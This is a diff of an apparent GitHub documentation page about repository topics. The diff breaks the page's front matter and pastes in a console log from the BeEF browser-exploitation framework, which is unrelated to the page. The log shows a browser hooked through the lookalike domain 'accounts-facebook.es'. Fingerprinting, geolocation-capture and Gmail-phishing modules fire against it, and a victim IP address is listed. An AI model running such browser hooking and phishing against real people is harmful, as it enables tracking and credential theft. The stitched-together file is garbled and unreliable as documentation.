@@ -1,4 +1,31 @@
----
+---msf6 > sudo ./beef -x
+[*] exec: sudo ./beef -x
+
+...
+
+[22:46:45][*] [ARE] Ruleset (Fingerprint Browser) parsed and stored successfully.
+[22:46:45][*] [ARE] Ruleset (Get Geolocation HTML5 (jking)) parsed and stored successfully.
+[22:46:45][*] [ARE] Ruleset (Google Phishing) parsed and stored successfully.
+[22:46:45][*] BeEF server started (press control+c to stop)
+[22:47:27][!] [Browser Details] Invalid browser name returned from the hook browser's initial connec
+[22:47:27][*] New Hooked Browser [id:1, ip:87.223.76.77, browser:UNKNOWN-124.0.0.0, os:Windows-10], hooked domain [[accounts-facebook.es:443](http://accounts-facebook.es:443/)]
+[22:47:27][*] [ARE] Checking if any defined rules should be triggered on target.
+[22:47:27]    |_  Hooked browser and OS match rule: Fingerprint Browser.
+[22:47:27]    |_  Hooked browser and OS match rule: Get Geolocation HTML5 (jking).
+
+[22:47:27]    |_  Hooked browser and OS match rule: Google Phishing.
+
+[22:47:27]    |_  Found [3/3] ARE rules matching the hooked browser.
+[22:47:27]    |_  Preparing JS for command id [1], module [fingerprint_browser]
+[22:47:27]    |_  Triggering rules [1, 2, 3] on HB 1
+[22:47:28]    |_  Preparing JS for command id [2], module [get_geolocation_html5_jking]
+[22:47:28]    |_  Triggering rules [1, 2, 3] on HB 1
+
+[22:47:28]    |_  Preparing JS for command id [3], module [gmail_phishing]
+[22:47:28]    |_  Triggering rules [1, 2, 3] on HB 1
+
+[22:47:30][*] Hooked browser [id:1, ip:87.223.76.77] has executed instructions (status: SUCCESS) from command module [cid:2, mod: 290, name:'Get Geolocation HTML5 (jking)']
+[22:47:30][*] Hooked browser [id:1, ip:87.223.76.77] has executed instructions (status: SUCCESS) from command module [cid:1, mod: 291, name:'Fingerprint Browser']
 title: Classifying your repository with topics
 intro: 'To help other people find and contribute to your project, you can add topics to your repository related to your project''s intended purpose, subject area, affinity groups, or other important qualities.'
 redirect_from:
